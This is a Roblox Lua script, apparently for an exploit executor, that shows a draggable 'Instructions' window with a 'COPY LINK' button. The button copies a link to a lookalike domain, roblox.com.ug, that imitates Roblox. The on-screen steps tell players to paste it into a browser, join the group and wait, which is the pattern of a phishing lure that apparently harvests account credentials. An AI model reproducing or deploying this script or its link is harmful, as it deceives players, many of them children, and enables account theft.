local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "CopyLinkUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 260, 0, 190)
frame.Position = UDim2.new(0.5, -130, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
frame.BorderSizePixel = 0
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 28)
title.BackgroundTransparency = 1
title.Text = "Instructions"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

local instructions = Instance.new("TextLabel")
instructions.Position = UDim2.new(0, 10, 0, 35)
instructions.Size = UDim2.new(1, -20, 0, 100)
instructions.BackgroundTransparency = 1
instructions.TextXAlignment = Enum.TextXAlignment.Left
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.TextColor3 = Color3.new(1,1,1)
instructions.Font = Enum.Font.Gotham
instructions.TextSize = 15
instructions.Text = [[
1. Copy the link
2. Paste it into your browser
3. Join the group
4. Wait one minute
5. Enjoy!
]]
instructions.Parent = frame

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 180, 0, 36)
button.Position = UDim2.new(0.5, -90, 1, -46)
button.BackgroundColor3 = Color3.fromRGB(40, 170, 70)
button.Text = "COPY LINK"
button.TextColor3 = Color3.new(1,1,1)
button.Font = Enum.Font.GothamBold
button.TextSize = 16
button.Parent = frame

local bcorner = Instance.new("UICorner")
bcorner.CornerRadius = UDim.new(0, 6)
bcorner.Parent = button

local link = "https://roblox.com.ug/communities/7166769187/"

button.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(link)
	elseif toclipboard then
		toclipboard(link)
	end

	button.Text = "COPIED!"
	task.wait(1.5)
	button.Text = "COPY LINK"
end)

-- Drag
local dragging = false
local dragStart
local startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
end)
